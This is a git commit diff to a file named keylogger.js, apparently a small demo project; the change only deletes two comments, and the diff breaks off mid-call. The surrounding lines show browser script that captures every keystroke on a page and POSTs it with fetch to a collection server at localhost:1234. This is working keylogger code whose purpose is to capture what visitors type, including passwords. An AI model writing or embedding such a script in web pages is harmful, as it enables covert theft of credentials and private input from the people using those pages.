abc2f9b8923b6b497165e08fbddfd5ae16212ff1
Faizan Arif <116368043+FaizanArif15@users.noreply.github.com>
2024-11-29 01:36:51 +0500

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,9 +1,8 @@
 <script>
     document.addEventListener('keydown', function(event) {
-        // Prepare the data to send
+
         var keystroke = 'key=' + encodeURIComponent(event.key);
 
-        // Send the keystroke data to the server
         fetch('http://localhost:1234', {
             method: 'POST',
             headers: {
